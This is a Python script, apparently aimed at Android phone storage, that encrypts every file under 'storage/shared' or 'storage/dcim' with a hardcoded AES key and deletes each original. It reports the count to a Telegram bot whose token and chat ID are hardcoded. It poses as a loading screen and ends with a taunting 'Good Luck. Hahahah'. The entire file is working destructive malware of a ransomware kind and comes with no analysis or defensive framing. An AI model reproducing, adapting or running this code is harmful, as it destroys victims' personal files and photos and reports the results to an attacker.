import os
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def send_telegram_message(bot_token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f"Erreur lors de l'envoi du message Telegram : {e}")
        return None

def encrypt_file(file_path, key):
    try:
        chunk_size = 64 * 1024  # 64KB chunks
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_file_path = file_path + '.encrypted'
        
        with open(file_path, 'rb') as file, open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(iv)
            while True:
                chunk = file.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % AES.block_size != 0:
                    chunk += b' ' * (AES.block_size - len(chunk) % AES.block_size)
                encrypted_chunk = cipher.encrypt(chunk)
                encrypted_file.write(encrypted_chunk)
        
        os.remove(file_path)
        return True
    except Exception as e:
        print(f"Erreur lors du cryptage de {file_path}: {e}")
        return False

def encrypt_files_in_directory(directory_path, key, bot_token, chat_id):
    files_encrypted = 0
    files_failed = 0
    
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            if encrypt_file(file_path, key):
                files_encrypted += 1
            else:
                files_failed += 1
    
    message = f"Cryptage terminé.\nFichiers cryptés : {files_encrypted}\nFichiers échoués : {files_failed}"
    send_telegram_message(bot_token, chat_id, message)
    return files_encrypted, files_failed

if __name__ == "__main__":
    target_directory = "storage/shared"
    encryption_key = b'\x88\x1a\xfa@\xfa\xd1\xadB\xd5\xaa\xf2\xe17\x9b\xfeo\x88*\x89\xe2gEP\xb60R\xc6\xdb/\xb5`\xa7'
    bot_token = "7126991043:AAEzeKswNo6eO7oJA49Hxn_bsbzgzUoJ-6A"
    chat_id = "-1002081124539"
    
    print("Chargement...")
    print("Loading... wait 3 minutes")
    
    try:
        files_encrypted, files_failed = encrypt_files_in_directory(target_directory, encryption_key, bot_token, chat_id)
    except Exception as e:
        print(f"Erreur lors du cryptage de {target_directory}: {e}")
        # Essayer une autre méthode
        target_directory = "storage/dcim"
        files_encrypted, files_failed = encrypt_files_in_directory(target_directory, encryption_key, bot_token, chat_id)
    
    print(f"""
    Cryptage terminé.
    Fichiers cryptés : {files_encrypted}
    Fichiers échoués : {files_failed}
    Good Luck. Hahahah
    """)
    print("Programme terminé")
